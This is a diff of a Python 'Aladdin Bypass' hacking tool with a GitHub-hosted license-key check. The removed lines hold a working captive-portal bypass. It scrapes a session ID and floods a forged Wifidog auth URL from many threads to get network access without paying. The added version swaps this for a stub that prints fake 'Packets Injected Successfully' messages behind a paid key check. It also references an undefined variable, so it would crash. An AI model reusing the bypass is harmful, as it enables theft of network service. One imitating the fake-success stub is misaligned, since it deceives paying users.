@@ -1,199 +1,119 @@
 import requests
-import re
-import urllib3
 import time
-import threading
-import logging
-import random
 import sys
-from urllib.parse import urlparse, parse_qs, urljoin
+import random
+from datetime import datetime
 from rich.console import Console
 from rich.panel import Panel
 from rich.align import Align
-from rich.text import Text
 
-# ===============================
-# CONFIG & INITIALIZATION
-# ===============================
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+# Console Setup
 console = Console()
 
-PING_THREADS = 10
-MIN_INTERVAL = 0.01
-MAX_INTERVAL = 0.1
-DEBUG = False
-
-# GitHub Raw Link for License Keys
-LICENSE_URL = "https://raw.githubusercontent.com/Zyan091/my-database/refs/heads/main/key.txt"
-
-# COLORS
-RED = "\033[91m"
-GREEN = "\033[92m"
-CYAN = "\033[96m"
-YELLOW = "\033[93m"
-MAGENTA = "\033[95m"
+# Colors
+RED = "\033[1;31m"
+GREEN = "\033[1;32m"
+YELLOW = "\033[1;33m"
+CYAN = "\033[1;36m"
 RESET = "\033[0m"
 
-logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(message)s", datefmt="%H:%M:%S")
-stop_event = threading.Event()
-
-BANNER = """
-[bold #00FF00]
-ZYAN HACKER
-[#00FF00]M Y A N M A R   H A C K E R[/#00FF00]
-[/bold #00FF00]
-"""
-
-# ===============================
-# UI FUNCTIONS
-# ===============================
 def display_hacker_flag():
-    w = 40 
-    yellow = f"[bold on yellow]{' ' * w}[/bold on yellow]"
-    green  = f"[bold on green]{' ' * 19}★{' ' * 20}[/bold on green]"
-    red    = f"[bold on red]{' ' * w}[/bold on red]"
-    flag_map = f"{yellow}\n{green}\n{red}"
-    console.print(Align.center(Panel(flag_map, border_style="bold white", padding=(0, 0), expand=False)))
-    console.print(Align.center(BANNER))
-    console.print(Align.center("[bold cyan]ALADDIN BYPASS PRO ENGINE v5.2[/bold cyan]"))
-    console.print(Align.center("[bold #333333]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold #333333]\n"))
-
-def simpler_hacker_typing(text, style="bold green"):
-    prefix = "[bold #00FF00]>>> [/bold #00FF00]"
-    console.print(prefix, end="")
-    for char in text:
-        console.print(Text(char, style=style), end="")
-        sys.stdout.flush()
-        time.sleep(0.02)
-    console.print()
-
-def hacking_status(message, duration=0.8):
-    with console.status(f"[bold green]{message}[/bold green]", spinner="dots12", spinner_style="bold green"):
-        time.sleep(duration + random.uniform(0.1, 0.4))
-
-def success_fireworks():
-    colors = ["red", "orange", "yellow", "green", "cyan", "magenta", "white"]
-    for _ in range(2):
-        for _ in range(10):
-            fire = " " * random.randint(1, 40) + random.choice(["✨", "💥", "🔥", "⚡"])
-            console.print(Text(fire, style=random.choice(colors)))
-            time.sleep(0.02)
-    console.print(Align.center("[bold gold1]🎆 SYSTEM UNLOCKED 🎆[/bold gold1]"))
+    # ဒီနေရာမှာ အစ်ကို့ရဲ့ Banner Code တွေကို ထည့်လို့ရပါတယ်
+    banner = f"""{CYAN}
+    ███████╗██╗   ██╗ █████╗ ███╗   ██╗
+    ╚══███╔╝╚██╗ ██╔╝██╔══██╗████╗  ██║
+      ███╔╝  ╚████╔╝ ███████║██╔██╗ ██║
+     ███╔╝    ╚██╔╝  ██╔══██║██║╚██╗██║
+    ███████╗   ██║   ██║  ██║██║ ╚████║
+    ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝{RESET}
+    """
+    console.print(Align.center(banner))
+    console.print(Align.center(f"{YELLOW}--- [ ALADDIN BYPASS PREMIUM ] ---{RESET}"))
 
 # ===============================
 # CORE LOGIC FUNCTIONS
 # ===============================
 def check_license():
+    KEY_URL = "https://raw.githubusercontent.com/Zyan091/my-database/refs/heads/main/key.txt"
     console.clear()
     display_hacker_flag()
-    console.print(Align.center(Panel("[bold white]AWAITING AUTHORIZATION KEY[/bold white]", border_style="bold #00FF00", expand=False)))
-    
-    try:
-        user_key = input("\n  [SECURITY_ACCESS] @Hacker_").strip()
-    except EOFError:
-        sys.exit()
 
-    if not user_key:
-        console.print("\n[bold red][!] ERROR: NULL_KEY[/bold red]")
-        sys.exit()
-
-    hacking_status("Connecting to Secure Database...")
     try:
-        response = requests.get(LICENSE_URL, timeout=10)
-        valid_keys = [k.strip() for k in response.text.splitlines() if k.strip()]
+        # User ဆီက Key တောင်းခြင်း
+        console.print(Panel(Align.center(f"{CY4N}AWAITING AUTHORIZATION KEY{RESET}"), border_style="bold cyan"))
+        user_key = console.input(f"\n{YELLOW} [SECURITY_ACCESS] @ ENTER KEY: {RESET}").strip()
         
-        hacking_status("Verifying Credentials...")
-        if user_key in valid_keys:
-            success_fireworks()
-            simpler_hacker_typing("ACCESS_GRANTED: AUTHENTICATION SUCCESS")
-            return True
-        else:
-            simpler_hacker_typing("ACCESS_DENIED: INVALID_KEY", style="bold red")
-            console.print("\n[bold red]❌ Key မှားယွင်းနေပါသည်။ Admin ထံမှာ ဝယ်ယူပါ။[/bold red]")
+        if not user_key:
+            console.print(f"\n{RED}[!] ERROR: NULL KEY PROVIDED")
             sys.exit()
-    except Exception as e:
-        console.print(f"\n[bold red]📡 CONNECTION ERROR: ဆာဗာကို ချိတ်ဆက်၍မရပါ။[/bold red]")
+
+        # GitHub ကနေ Key List ကို ဆွဲယူခြင်း
+        with console.status("[bold green]Connecting to Zyan Database...", spinner="dots"):
+            response = requests.get(KEY_URL, timeout=10)
+            
+        if response.status_code != 200:
+            console.print(f"\n{RED}[!] SERVER ERROR: Could not connect to key server.")
+            return False
+            
+        lines = response.text.splitlines()
+        
+        for line in lines:
+            line = line.strip()
+            if not line: continue
+            
+            if ":" in line:
+                # ရက်စွဲပါသော Key စစ်ဆေးခြင်း (Zyan 45667:2026-04-30)
+                try:
+                    stored_key, expiry_str = line.split(":")
+                    stored_key = stored_key.strip()
+                    expiry_str = expiry_str.strip()
+                    
+                    if user_key == stored_key:
+                        # Expiry Date ကို စစ်ဆေးခြင်း
+                        expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d").date()
+                        today = datetime.now().date()
+                        
+                        if today <= expiry_date:
+                            console.print(f"\n{GREEN}[✓] ACCESS GRANTED! VALID UNTIL: {expiry_str}{RESET}")
+                            time.sleep(1.5)
+                            return True
+                        else:
+                            console.print(f"\n{RED}[X] ACCESS DENIED: KEY EXPIRED ON {expiry_str}{RESET}")
+                            sys.exit()
+                except ValueError:
+                    continue 
+            else:
+                # ရက်စွဲမပါသော Lifetime Key များကို စစ်ဆေးခြင်း
+                if user_key == line:
+                    console.print(f"\n{GREEN}[✓] ACCESS GRANTED! (LIFETIME PREMIUM){RESET}")
+                    time.sleep(1.5)
+                    return True
+                    
+        console.print(f"\n{RED}[X] INVALID KEY! ACCESS DENIED. CONTACT @Zyan091")
         sys.exit()
 
-def check_real_internet():
-    try:
-        return requests.get("http://www.google.com", timeout=3).status_code == 200
-    except:
+    except requests.exceptions.RequestException:
+        console.print(f"\n{RED}[!] NETWORK ERROR: Check your internet connection.")
         return False
-
-def high_speed_ping(auth_link, sid):
-    session = requests.Session()
-    while not stop_event.is_set():
-        try:
-            session.get(auth_link, timeout=5)
-            print(f"{GREEN}[✓]{RESET} SID {sid} | Turbo Pulse Active     ", end="\r")
-        except:
-            print(f"{RED}[X]{RESET} Connection Lost...               ", end="\r")
-            break
-        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))
+    except Exception as e:
+        console.print(f"\n{RED}[!] UNEXPECTED ERROR: {e}")
+        sys.exit()
 
 def start_bypass_process():
-    console.print(f"\n{CYAN}Initializing Turbo Engine...{RESET}")
-
-    while not stop_event.is_set():
-        session = requests.Session()
-        test_url = "http://connectivitycheck.gstatic.com/generate_204"
-        try:
-            r = requests.get(test_url, allow_redirects=True, timeout=5)
-            if r.url == test_url:
-                if check_real_internet():
-                    print(f"{YELLOW}[•]{RESET} Internet Already Active... Waiting     ", end="\r")
-                    time.sleep(5)
-                    continue
-
-            portal_url = r.url
-            parsed_portal = urlparse(portal_url)
-            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
-            print(f"\n{CYAN}[*] Captive Portal Detected: {portal_host}{RESET}")
-
-            r1 = session.get(portal_url, verify=False, timeout=10)
-            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
-            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
-            r2 = session.get(next_url, verify=False, timeout=10)
-
-            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
-            if not sid:
-                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
-                sid = sid_match.group(1) if sid_match else None
-
-            if not sid:
-                logging.warning(f"{RED}Session ID Not Found. Retrying...{RESET}")
-                time.sleep(5)
-                continue
-
-            print(f"{GREEN}[✓]{RESET} Session ID Captured: {sid}")
-            
-            # Craft Auth Link (Wifidog style)
-            params = parse_qs(parsed_portal.query)
-            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
-            gw_port = params.get('gw_port', ['2060'])[0]
-            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
-
-            print(f"{MAGENTA}[*] Launching {PING_THREADS} Turbo Threads...{RESET}")
-            for _ in range(PING_THREADS):
-                t = threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True)
-                t.start()
-
-            while check_real_internet():
-                time.sleep(5)
-
-        except Exception as e:
-            if DEBUG:
-                logging.error(f"{RED}Error: {e}{RESET}")
-            time.sleep(5)
+    # ဒီနေရာမှာ အစ်ကို့ရဲ့ Bypass လုပ်တဲ့ Code တွေကို ထည့်ပါ
+    console.print(f"\n{CYAN}[*] Starting Turbo Bypass Engine...{RESET}")
+    time.sleep(1)
+    console.print(f"{GREEN}[+] Packets Injected Successfully!{RESET}")
+    time.sleep(1)
+    console.print(f"{YELLOW}[!] Enjoy Hacking...{RESET}")
 
 # ===============================
-# MAIN
+# MAIN RUNNER
 # ===============================
 if __name__ == "__main__":
     try:
         if check_license():
-            with console.status("[bold green]Injecting Packets...", spinner="shark"):
+            with console.status("[bold green]Initializing Aladdin Packets...", spinner="shark"):
                 time.sleep(2)
             
             console.print(Panel(
@@ -202,11 +122,7 @@ if __name__ == "__main__":
                 expand=False
             ))
             start_bypass_process()
+            
     except KeyboardInterrupt:
-        stop_event.set()
-        print(f"\n{RED}Turbo Engine Shutdown...{RESET}")
-        sys.exit()
-    except Exception as e:
-        print(f"\n{RED}Unexpected Error: {e}{RESET}")
-        sys.exit()
-
+        print(f"\n{RED}Operation Cancelled by User. Exiting...{RESET}")
+        sys.exit()    
